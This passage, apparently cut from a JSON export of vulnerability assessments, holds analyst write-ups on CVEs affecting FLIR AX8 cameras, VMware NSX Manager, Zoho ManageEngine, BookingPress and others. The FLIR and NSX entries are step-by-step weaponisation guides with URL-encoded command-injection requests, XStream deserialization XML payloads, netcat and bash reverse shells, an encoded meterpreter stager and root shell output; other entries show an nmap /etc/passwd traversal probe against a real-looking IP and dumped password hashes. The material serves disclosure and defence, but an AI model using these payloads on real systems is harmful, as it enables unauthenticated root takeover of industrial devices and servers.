      "document": "FLIR AX8  is a thermal sensor with imaging capabilities, combining thermal and visual cameras that provides continuous temperature monitoring and alarming for critical electrical and mechanical equipment.\r\nThis device is typically used for monitoring industrial environments in a LAN based configuration.  Occasionally you can find a FLIR AX8 device where the HTTP web interface is exposed to the public internet.\r\n\r\nFLIR AX8 is affected by an unauthenticated remote command injection vulnerability. This can be exploited to inject and execute arbitrary shell commands as the root user through the `id` HTTP POST parameter in `res.php` endpoint. A successful exploit could allow the attacker to execute arbitrary commands on the underlying operating system with the root privileges. This issue affects all FLIR AX8 thermal sensor cameras version up to and including `1.46.16`. \r\n\r\nThe endpoint `/res.php` can be called remotely without user authentication as there is no cookie verification `Cookie: PHPSESSID=ID` to check if the request is legitimate. The second problem is that the POST parameter `id` can be injected to execute any unix command as demonstrated in the example below.\r\n\r\nCreate a netcat reverse shell payload with `msfvenom`\r\n```\r\n# msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.100.7 LPORT=4444 -f raw\r\n[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload\r\n[-] No arch selected, selecting arch: cmd from the payload\r\nNo encoder specified, outputting raw payload\r\nPayload size: 100 bytes\r\nmkfifo /tmp/ibcnr; nc 192.168.100.7 4444 0</tmp/ibcnr | /bin/sh >/tmp/ibcnr 2>&1; rm /tmp/ibcnr\r\n```\r\nUse this payload in a burp POST request using the vulnerable `id` parameter to launch a netcat shell.\r\n**Note:** Do not forget to apply the URL encoding.\r\n```\r\nPOST /res.php HTTP/1.1\r\nHost: 192.168.100.2\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nContent-Length: 174\r\n\r\naction=alarm&id=2;mkfifo%20%2ftmp%2fibcnr%3b%20nc%20192.168.100.7%204444%200%3c%2ftmp%2fibcnr%20%7c%20%2fbin%2fsh%20%3e%2ftmp%2fibcnr%202%3e%261%3b%20rm%20%2ftmp%2fibcnr\r\n```\r\nClick send and you will receive a `netcat` shell on the attacker host.\r\n```\r\n# nc -lnvp 4444\r\nlistening on [any] 4444 ...\r\nconnect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 51556\r\nwhoami\r\nroot\r\nuname -a\r\nLinux neco 3.0.35-flir #1 PREEMPT Thu Oct 20 08:20:20 CET 2022 armv7l GNU/Linux\r\n```\r\nThe root cause of this command injection vulnerability is the lack of sanitization checks on the variable `$_POST[\"id\"]`, line 65 in the file `/FLIR/usr/www/res.php` and malicious actors can therefore take advantage of the `shell_exec()` function to execute unexpected arbitrary shell commands.\r\n\r\nBesides this vulnerability, three other vulnerabilities were identified. Check the respective CVE's for more info.\r\n* [CVE-2022-37060] - Unauthenticated Directory Traversal\r\n* [CVE-2022-37062] - Improper Access Control\r\n* [CVE-2022-37063] - Reflected cross-site scripting\r\n\r\nAs stated in the beginning of this analysis, it very unlikely to find this type of devices exposed to the Internet, but you will find them quite often in industrial environments deployed in a LAN based configuration.\r\n\r\nI have created  Metasploit module `exploit/linux/http/flir_ax8_unauth_rce_cve_2022_37061` that will check if the device is vulnerable and launches a reverse `netcat` shell or `meterpreter` session on a vulnerable device . You can download this module from the link in the reference section below and follow the instructions to run it locally.\r\n\r\nPushing this module to the Metasploit mainstream is in progress.\r\n\r\n### Mitigation\r\nUpgrade camera version to a higher firmware version then `1.46.16`.\r\n\r\n### References\r\n[Packetstorm] (https://packetstormsecurity.com/files/168114/FLIX-AX8-1.46.16-Remote-Command-Execution.html)\r\n[Metasploit Development h00die-gr3y] (https://github.com/h00die-gr3y/Metasploit)\r\n\r\n### Credits\r\nCredits goes to the security researchers below who discovered these vulnerabilities.\r\n* [Thomas Knudsen] (https://www.linkedin.com/in/thomasjknudsen)\r\n* [Samy Younsi] (https://www.linkedin.com/in/samy-younsi)  \r\n\r\n\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Impact",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "c3e1bc61-beda-45e5-81f2-e00d8dd65c31",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "61c5f31d-f061-48f7-8030-4bb9fc995e69",
      "created": "2022-10-23T17:47:49.017394Z",
      "revisionDate": "2023-11-28T18:13:11.589175Z",
      "document": "Rapid7 has a [blog](https://www.rapid7.com/blog/post/2022/10/17/cve-2022-42889-keep-calm-and-stop-saying-4shell/) on this vuln with a particularly apt title. On the surface, the hyped-up internet chatter comparing this to Log4Shell might be justifiable, since we're talking about an open-source library vuln, but practically speaking, it will be rare for real-world applications to be remotely exploitable out of the box. We're seeing reports of \"exploitation\" in the wild, but the upshot of those reports so far seems to be that opportunists are hurling clumsy exploits at the internet without actually finding any vulnerable code paths. There's a trees falling in the forest metaphor somewhere in here. ",
      "score": 3,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "031caf19-627a-4ba5-b387-d1c51084a5be",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "7734f7c5-d029-4c2d-9e33-debeabf4e7ff",
      "created": "2022-10-25T17:15:46.927551Z",
      "revisionDate": "2022-10-25T17:15:46.926308Z",
      "document": "This was an interesting vulnerability first found by Vinicius, and which then had a nice writeup on how to exploit it published by Y4er at https://xz.aliyun.com/t/11578. It was subsequently patched by Zoho and the patch can be found at https://archives2.manageengine.com/passwordmanagerpro/12101/ManageEngine_PasswordManager_Pro_12100_to_12101.ppm, whilst the advisory can be found at https://www.manageengine.com/products/passwordmanagerpro/advisory/cve-2022-35405.html.\r\n\r\nBy sending a XML-RPC serialized message via a POST request to the `/xmlrpc` endpoint as an unauthenticated user, the specs of which can be found at http://xmlrpc.com/spec.md, it is possible to gain RCE as the `SYSTEM` user that Zoho Password Manager runs as. Note that the name of the method being called does not have to be valid, and the name of the parameter passed to that method also does not have to be valid. All that matters is that the value of the parameter is marked as a serializable object that is Base64 encoded. This can be seen in the Metasploit module at https://github.com/rapid7/metasploit-framework/pull/16852/files#diff-eaa6a1c5246f1059f414cda95a9c5c4e3e1d0adc4373ce64f7165fefe7576ec6R129-R157\r\n\r\nAdditionally, since the target will also respond with `Failed to read result object: null` if you send the endpoint an empty string and its vulnerable to deserialization attacks, it makes it really easy to put together a full exploit for this vulnerability that not only can check if the target is vulnerable but can also reliably exploit it. The last step was to use the CommonsBeanutils1 deserialization chain and then supply the command we want to execute and boom, we can go from an unauthenticated user to SYSTEM remotely and without authentication.\r\n\r\nNow what are the implications of this? Well it depends on the product. In the case of ManageEngine Access Manager Plus you need authentication to exploit this issue which may negate some of the risk, however one still needs to consider that successful exploitation will result in high privileged user access. However with Zoho ManageEngine Password Manager Pro and PAM360, no authentication is needed yet you will still get very high privileged user access.\r\n\r\nSecondly one needs to consider the position of where these products will be placed in the network. Zoho ManageEngine Password Manager Pro will likely be internally facing as there is likely not a need to make it externally accessible, or if it is it will be accessible via a VPN. On the other hand ManageEngine Access Manager Plus and PAM360 are access management solutions so it is feasible, particularly in the world of remote work that we live in today, that these solutions would be accessible over the internet. \r\n\r\nIn the worse case scenario this would mean an unauthenticated attacker could potentially connect to a target server remotely over the internet, and with no authentication get SYSTEM level access on that server, which will also be controlling sensitive operations via access management controls, or will be holding user's passwords, which could then be used to gain further access into the target network.\r\n\r\nMore realistically though is the scenario that these are internally facing and an internal attacker uses this vulnerability to gain control over access management software to avoid detection or grant themselves access to sensitive resources, or steals passwords to gain further access into the target network.\r\n\r\nIn either case the risk of this vulnerability is quite high and given the incredibly easy exploitation of this issue combined with known exploited in the wild activity, this should be patched as soon as possible and you should investigate your servers for any suspicious activity if you haven't patched already.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "bbafd266-3186-4651-870d-68f955b48699",
      "editorId": "f77aeb43-78be-4178-8c07-a9563865909b",
      "topicId": "9edec08c-8f54-4151-ba9c-ca9be7fc610e",
      "created": "2022-10-31T13:15:33.297001Z",
      "revisionDate": "2022-10-31T13:15:33.296435Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": []
    },
    {
      "id": "714afe54-6342-4a42-8898-d6db6aa4591f",
      "editorId": "721d4106-bb2f-4fe8-9640-57afee5adfad",
      "topicId": "f8c8a2cc-1c6e-4010-b89a-7e2f0e7c5cce",
      "created": "2022-11-03T17:05:36.079435Z",
      "revisionDate": "2022-11-03T17:05:36.077138Z",
      "document": "nmap --script exploit 164.100.94.186\r\nDisclosure date: 2005-10-nil\r\n|     Extra information:\r\n|       ../../../../../etc/passwd :\r\n|   <html><head><title>Request Rejected</title></head><body>The requested URL was rejected. Please consult with your administrator.<br><br>Your support ID is: 16035532474987810818<br><br><a href='javascript:history.back();'>[Go Back]</a></body></html>\r\n|     References:\r\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299\r\n|_      http://www.exploit-db.com/exploits/1244/\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        }
      ]
    },
    {
      "id": "22e1bc30-6976-433d-b623-5e6da1928eb6",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "f26993d0-c6c1-455f-991a-83a5cb45bb19",
      "created": "2022-11-06T15:12:14.758357Z",
      "revisionDate": "2022-11-07T17:58:09.397745Z",
      "document": "On the 25th October 2022, security researcher Sina Kheirkhah and Steven Seeley from  Source Incite discovered a remote code execution in VMware NSX Manager (NSX-V) that exploits the XStream vulnerability that was identified in August 2021. \r\nThere is an excellent writeup that can be found here: [Eat What You Kill](https://srcincite.io/blog/2022/10/25/eat-what-you-kill-pre-authenticated-rce-in-vmware-nsx-manager.html) which explains this technical details of this remote code execution. \r\nPlease read the article first because I will not repeat all the good things explained in the article, but focus more on how to weaponize this exploit.\r\n\r\nIn a nut shell, XStream is a set of concise and easy-to-use open-source class libraries for marshalling Java objects into XML or unmarshalling XML into Java objects. It is a two-way converter between Java objects and XML. \r\nIn XStream <= `1.4.18 ` there is a de-serialization of untrusted data and is tracked as CVE-2021-39144. VMWare NSX Manager (NSX-V) uses the package `xstream-1.4.18.jar` so it is vulnerable to this de-serialization vulnerability.\r\n\r\nBut this is not the only part. \r\n\r\nTo make this work  `Dynamic Proxies` are used. \r\n`Dynamic proxy` is a design pattern in Java which provides a proxy for a certain object, and the proxy object controls the access to the real object.  These proxies are fronts or wrappers that pass function invocation through their own facilities (onto real methods) and this is being used to trigger the execution.\r\n\r\nAnd the final piece is to identify an endpoint that is reachable from an unauthenticated context, where an attacker can send a specially crafted XStream marshalled payload with the dynamic proxy and trigger remote code execution in the context of root!\r\nThis unauthenticated  endpoint can be  found in `/home/secureall/secureall/sem/WEB-INF/spring/security-config.xml` configuration and is pre-authenticated due to the use of `isAnonymous`.\r\n\r\n```\r\n<http auto-config=\"false\" use-expressions=\"true\" entry-point-ref=\"authenticationEntryPoint\" create-session=\"stateless\">\r\n        <csrf disabled=\"true\" />\r\n        <!-- ... -->\r\n        <intercept-url pattern=\"/api/2.0/services/usermgmt/password/**\" access=\"isAnonymous()\" />\r\n        <intercept-url pattern=\"/api/2.0/services/usermgmt/passwordhint/**\" access=\"isAnonymous()\" />\r\n        <!-- ... -->\r\n        <custom-filter position=\"BASIC_AUTH_FILTER\" ref=\"basicSSOAuthNFilter\"/>\r\n        <custom-filter position=\"PRE_AUTH_FILTER\" ref=\"preAuthFilter\"/>\r\n        <custom-filter after=\"SECURITY_CONTEXT_FILTER\" ref=\"jwtAuthFilter\"/>\r\n        <custom-filter before=\"BASIC_AUTH_FILTER\" ref=\"unamePasswordAuthFilter\"/>\r\n    </http>\r\n```\r\n\r\nSo far, so good, but how do we weaponize this to achieve the remote code execution?\r\n\r\nAt first, take this XML example below to craft your malicious XML payload.\r\n```\r\n<sorted-set>\r\n    <string>foo</string>\r\n    <dynamic-proxy>\r\n        <interface>java.lang.Comparable</interface>\r\n        <handler class=\"java.beans.EventHandler\">\r\n            <target class=\"java.lang.ProcessBuilder\">\r\n                <command>\r\n                    <string>PUT YOUR PAYLOAD HERE</string>\r\n                </command>\r\n            </target>\r\n            <action>start</action>\r\n        </handler>\r\n    </dynamic-proxy>\r\n</sorted-set>\r\n```\r\nLet's take a reverse bash shell payload example: `bash -i >& /dev/tcp/ATTACKER-IP/ATTACKER-PORT 0>&1`  and send this with `burpsuite` to the pre-authenticated endpoint of a vulnerable VMware NSX Manager. The pre-authenticated endpoint will work with any randomized string `/api/2.0/services/usermgmt/password/<random string>`.\r\n\r\n**Note:** please use HTML encoding for your payload inside the XML, otherwise it will NOT work.\r\n\r\n**Burp Request**\r\n```\r\nPUT /api/2.0/services/usermgmt/password/blablabla HTTP/1.1\r\nHost: 192.168.100.5\r\nContent-Type: application/xml\r\nContent-Length: 587\r\n\r\n<sorted-set>\r\n    <string>foo</string>\r\n    <dynamic-proxy>\r\n        <interface>java.lang.Comparable</interface>\r\n        <handler class=\"java.beans.EventHandler\">\r\n            <target class=\"java.lang.ProcessBuilder\">\r\n                <command>\r\n                    <string>bash</string>\r\n                    <string>-c</string>\r\n                    <string>bash -i &#x3e;&#x26; /dev/tcp/192.168.100.7/4444 0&#x3e;&#x26;1</string>\r\n                </command>\r\n            </target>\r\n            <action>start</action>\r\n        </handler>\r\n    </dynamic-proxy>\r\n</sorted-set>\r\n```\r\nStart a Netcat listener on attacker host and send the burp request to the vulnerable endpoint.\r\nYou will get a `bash` shell on your attacker machine.\r\n```\r\n# nc -lnvp 4444\r\nlistening on [any] 4444 ...\r\nconnect to [192.168.100.7] from (UNKNOWN) [192.168.100.5] 46488\r\nbash: cannot set terminal process group (5722): Inappropriate ioctl for device\r\nbash: no job control in this shell\r\nbash-5.0# uname -a\r\nuname -a\r\nLinux manager 4.9.297 #1 SMP Tue Feb 1 08:50:25 GMT 2022 x86_64 GNU/Linux\r\nbash-5.0# whoami\r\nwhoami\r\nroot\r\nbash-5.0# \r\n```\r\nLet's take another example where we launch a meterpreter session using `Metasploit`.\r\nFirst create a python meterpreter payload using `mfsvenom`.\r\n```\r\n# msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.100.7 LPORT=4444 -f raw\r\n[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload\r\n[-] No arch selected, selecting arch: python from the payload\r\nNo encoder specified, outputting raw payload\r\nPayload size: 497 bytes\r\nexec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMTAwLjcnLDQ0NDQpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQo=')[0]))\r\n```\r\nEncode this payload with an HTML encoder. There are a lot of good HTML encoders online that you can use -> [Online HTML encoder](https://emn178.github.io/online-tools/html_encode.html)\r\nAnd construct the XML payload below with `burpsuite`.\r\n```\r\nPUT /api/2.0/services/usermgmt/password/cuckoo HTTP/1.1\r\nHost: 192.168.100.5\r\nContent-Type: application/xml\r\nContent-Length: 1055\r\n\r\n<sorted-set>\r\n    <string>foo</string>\r\n    <dynamic-proxy>\r\n        <interface>java.lang.Comparable</interface>\r\n        <handler class=\"java.beans.EventHandler\">\r\n            <target class=\"java.lang.ProcessBuilder\">\r\n                <command>\r\n                    <string>python</string>\r\n                    <string>-c</string>\r\n                    <string>exec(__import__(&#39;base64&#39;).b64decode(__import__(&#39;codecs&#39;).getencoder(&#39;utf-8&#39;)(&#39;aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMTAwLjcnLDQ0NDQpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQo=&#39;)[0]))</string>\r\n                </command>\r\n            </target>\r\n            <action>start</action>\r\n        </handler>\r\n    </dynamic-proxy>\r\n</sorted-set>\r\n``` \r\nStart up a python meterpreter listener in `Metasploit` using the `multi/handler`.\r\n```\r\nmsf6 > use multi/handler\r\n[*] Using configured payload python/meterpreter/reverse_tcp\r\nmsf6 exploit(multi/handler) > set lport 4444\r\nlport => 4444\r\nmsf6 exploit(multi/handler) > options\r\n\r\nModule options (exploit/multi/handler):\r\n\r\n   Name  Current Setting  Required  Description\r\n   ----  ---------------  --------  -----------\r\n\r\nPayload options (python/meterpreter/reverse_tcp):\r\n\r\n   Name   Current Setting  Required  Description\r\n   ----   ---------------  --------  -----------\r\n   LHOST  0.0.0.0          yes       The listen address (an interface may be specified)\r\n   LPORT  4444             yes       The listen port\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   Wildcard Target\r\n\r\nmsf6 exploit(multi/handler) > exploit -j -z\r\n[*] Exploit running as background job 0.\r\n[*] Exploit completed, but no session was created.\r\n\r\n[*] Started reverse TCP handler on 0.0.0.0:4444\r\n```\r\nSend the burp request and wait for meterpreter session to come in.\r\n```\r\nmsf6 exploit(multi/handler) > [*] Sending stage (40164 bytes) to 192.168.100.5\r\n[*] Sending stage (40168 bytes) to 192.168.100.5\r\n[*] Meterpreter session 5 opened (192.168.100.7:4444 -> 192.168.100.5:58920) at 2022-11-06 06:47:59 +0000\r\n\r\nmsf6 exploit(multi/handler) > sessions\r\n\r\nActive sessions\r\n===============\r\n\r\n  Id  Name  Type                      Information     Connection\r\n  --  ----  ----                      -----------     ----------\r\n  5         meterpreter python/linux  root @ manager  192.168.100.7:4444 -> 192.168.100.5:58920 (192.168.100.5)\r\n\r\nmsf6 exploit(multi/handler) > sessions -i 5\r\n[*] Starting interaction with 5...\r\n\r\nmeterpreter > sysinfo\r\nComputer        : manager\r\nOS              : Linux 4.9.297 #1 SMP Tue Feb 1 08:50:25 GMT 2022\r\nArchitecture    : x64\r\nSystem Language : en_US\r\nMeterpreter     : python/linux\r\nmeterpreter > getuid\r\nServer username: root\r\nmeterpreter >\r\n```\r\nThe examples above show that it is pretty simple to weaponize and therefore there is a high probability of exploitation in the wild.\r\n`VMware Cloud Foundation 3.x` and more specific `NSX Manager Data Center for vSphere` up to and including version ` 6.4.13` are vulnerable to Remote Command Injection using XStream.\r\n\r\nI have created a  Metasploit module that has been submitted to the mainstream for production.  A local version of this module can found at the Reference section.\r\n\r\n## Mitigation\r\nPlease update `VMware NSX Manager` to `6.4.14` and follow the instructions in VMware Knowledge Base article listed in the Reference section.\r\n\r\n## References\r\n[Eat What You Kill::Pre-authenticated Remote Code Execution in VMWare NSX Manager](https://srcincite.io/blog/2022/10/25/eat-what-you-kill-pre-authenticated-rce-in-vmware-nsx-manager.html) \r\n[VMware advisory] (https://www.vmware.com/security/advisories/VMSA-2022-0027.html)\r\n[VMware KB] (https://kb.vmware.com/s/article/89809)\r\n[Metasploit Development h00die-gr3y] (https://github.com/h00die-gr3y/Metasploit/blob/main/README.md)\r\n\r\n### Credits\r\nCredits goes to the security researchers below who discovered these vulnerabilities.\r\n* [Sina Kheirkhah](https://twitter.com/SinSinology)\r\n* [Steven Seeley](https://twitter.com/steventseeley)\r\n\r\n",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "70eb536f-9fef-40dd-91dd-1bb2c320992d",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "97a518d0-3f28-45a7-bda4-6a36eef597f8",
      "created": "2022-11-07T09:08:58.119384Z",
      "revisionDate": "2022-11-07T09:11:11.838052Z",
      "document": "It has been proven working well on production domains (cf. https://twitter.com/an0n_r0/status/1589405818885398528). kpasswd support [is being implemented in impacket](https://github.com/SecureAuthCorp/impacket/pull/1189) and the vuln will be exploitable with [ticketer](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py).\r\nNote : this vulnerability concerns [Samba AD](https://wiki.samba.org/index.php/Setting_up_Samba_as_an_Active_Directory_Domain_Controller) and not [MS AD](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview).",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "b0718d9b-f238-4c88-904a-902519f63c9f",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "027ec85e-8add-430e-969e-34b5788d912b",
      "created": "2022-11-09T15:58:30.385992Z",
      "revisionDate": "2022-11-12T19:47:04.949233Z",
      "document": "This is a trivial SQL injection and is very easy to exploit. The vulnerability lies in the `bookingpress_front_get_category_services` action in the BookingPress Wordpress Plugin. The vulnerable action accepts a parameter `total_service` which doesn't properly sanitize input before passing it into a dynamically generated SQL query. \r\n\r\n\r\nThe vulnerability allows an unauthenticated attacker to instantly dump all the username and password hashes in the database. Anyone that can access the plugin page, also has access to all the creds in the database:\r\n```\r\nWordpress User Credentials\r\n==========================\r\n\r\n Username       Email                         Hash\r\n --------       -----                         ----\r\n admin          admin@admin.com               $P$BfxUckldN6AiHPD0BK6jg58se2b.aL.\r\n hackerman      hackerman@hacktheworld.io     $P$BESfz7bqSOY8VkUfuYXAZ/bT5E36ww/\r\n mr_metasploit  mr_metasploit@metaslpoit.org  $P$BDb8pIfym5dS6WTnNU8vU5Uk6i89fk.\r\n msfuser        msfuser@rapid7.com            $P$BpITVDPiqOZ7fyQbI5g9rsgUvZQFBd1\r\n todd           todd@toddtown.com             $P$BnlpkVgxGFWnmvdDQ3JStgpIx8LMFj0\r\n```\r\n(the above output was generated from running the metasploit module against BookingPress v1.0.10)\r\n\r\nWith only a few thousand active installations I gave the Attacker Value a 2/5.  Always be sure to keep your WordPress plugins up to date!\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Lateral Movement",
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "d0fb223a-ebc9-41f2-8b46-6aca975f5785",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "eb86163a-d6fe-4561-8d2c-40ce96fb9f2f",
      "created": "2022-11-16T22:34:46.98675Z",
      "revisionDate": "2023-02-02T21:14:07.154577Z",
      "document": "This permits a user who already has an administrator account to create a shell on the target device. There are other (authorized) ways to do this, so this vulnerability is pretty minor, IMO, although if it IS exploited it grants access to a network load balancer which is kind of a big deal.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "c107c220-be41-46ae-b8b5-9f93306f01b1",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "538fea18-4839-4072-8ada-785504e0e1d2",
      "created": "2022-11-16T22:36:42.527977Z",
      "revisionDate": "2023-02-02T21:13:45.856188Z",
